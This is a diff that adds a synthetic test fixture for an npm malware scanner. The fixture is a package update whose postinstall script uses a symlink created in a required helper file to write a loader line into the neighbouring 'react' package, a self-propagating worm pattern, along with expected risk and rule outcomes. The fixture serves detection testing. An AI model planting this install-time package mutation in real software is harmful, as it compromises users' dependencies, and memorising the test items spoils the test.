@@ -1,0 +1,65 @@
+{
+  "id": "install-root-cross-file-symlink",
+  "title": "Existing postinstall hook writes through a symlink that a required module created",
+  "ecosystem": "npm",
+  "verdict": "malicious",
+  "threatClass": "self-propagating-worm",
+  "source": "synthetic",
+  "intent": "The write destination in install.js is inside the package, but a module it requires links that directory to a sibling package. Inert fixture. The source never names the install root, so co-occurrence scoring misses it; reported as a frontier case for propagation.package-mutation.",
+  "expectMinRisk": "high",
+  "expectAnyRule": ["propagation.package-mutation"],
+  "category": "install-time-self-propagation",
+  "previousPackageJson": {
+    "name": "tinyfmt",
+    "version": "2.3.0",
+    "scripts": {
+      "postinstall": "node install.js"
+    }
+  },
+  "stagedPackageJson": {
+    "name": "tinyfmt",
+    "version": "2.3.1",
+    "scripts": {
+      "postinstall": "node install.js"
+    }
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 80,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"tinyfmt\",\"version\":\"2.3.0\",\"scripts\":{\"postinstall\":\"node install.js\"}}"
+    },
+    {
+      "path": "install.js",
+      "size": 34,
+      "sha256": "prev-install-js",
+      "flags": [],
+      "textSample": "console.log('tinyfmt installed');\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 80,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"tinyfmt\",\"version\":\"2.3.1\",\"scripts\":{\"postinstall\":\"node install.js\"}}"
+    },
+    {
+      "path": "install.js",
+      "size": 174,
+      "sha256": "staged-install-js",
+      "flags": [],
+      "textSample": "const fs = require('node:fs');\nconst path = require('node:path');\nrequire('./l.js');\nfs.writeFileSync(path.join(__dirname, 'h', 'index.js'), \"require('tinyfmt/loader');\\n\");\n"
+    },
+    {
+      "path": "l.js",
+      "size": 121,
+      "sha256": "staged-l-js",
+      "flags": [],
+      "textSample": "const fs = require('node:fs');\nconst path = require('node:path');\nfs.symlinkSync('../react', path.join(__dirname, 'h'));\n"
+    }
+  ]
+}
